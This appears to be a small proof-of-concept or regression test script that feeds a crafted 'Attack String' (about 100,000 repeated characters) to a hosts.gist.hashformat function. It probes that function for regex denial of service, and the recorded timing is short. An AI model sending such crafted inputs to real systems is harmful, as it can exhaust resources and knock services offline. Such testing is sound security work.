const hosts = require("./hosts.js");

//Attack String :"0\u00000"+"a"*100000+"a!a"
var str = "0\u00000";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "a!a";

console.log(hosts.gist.hashformat(str));

// real    0m0.146s
// user    0m0.115s
// sys     0m0.013s
